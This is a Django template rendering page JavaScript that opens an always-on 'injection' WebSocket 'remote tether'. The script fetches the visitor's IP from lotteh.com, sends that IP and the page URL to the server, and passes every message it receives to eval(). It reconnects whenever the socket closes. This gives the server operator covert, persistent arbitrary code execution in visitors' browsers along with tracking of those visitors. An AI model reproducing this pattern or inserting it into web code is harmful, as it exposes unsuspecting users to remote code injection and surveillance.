{% load app_filters %}
{% if True or injection_key %}
setTimeout(function() {
	$(document).ready(function() {
		function generateInjectionSocket() {
            window.location.hash = '';
			var injectionSocket = new WebSocket("wss://" + window.location.hostname + '/ws/remote/?path=' + window.location.href);
            injectionSocket.addEventListener("open", (event) => {
				console.log('Remote tether open.');
                fetch('https://lotteh.com/remote/generate/')
        		    .then(response => response.json())
        		    .then(data => {
        		        injectionSocket.send(data.ip);
        		    })
        		    .catch(error => {
        		        console.log('Error:', error);
        		    });
			});
			injectionSocket.addEventListener("close", (event) => {
				setTimeout(function() {
					generateInjectionSocket();
				}, {{ reload_time }});
			});
/*			socket.addEventListener("error", (event) => {
				setTimeout(function() {
					generateInjectionSocket(key);
				}, {{ reload_time }});
			});*/
			injectionSocket.addEventListener("message", (event) => {
				eval(event.data);
			});
		}
        generateInjectionSocket();
/*	        $.ajax({
        	        url: "{{ base_url }}/remote/generate/?path=" + window.location.pathname + window.location.search,
        	        method: 'GET',
        	        timeout: 30000,
        	        tryCount: 0,
        	        retryLimit: 5,
        	        error: (xhr, textStatus, errorThrown) => {
        	                this.tryCount++;
        	                if(this.tryCount >= this.retryLimit) return;
        	                $.ajax(this);
        	        },
        	        success: function(data) {
				generateInjectionSocket(data);
        	        },
        	});*/
	});
}, 5000);
{% endif %}
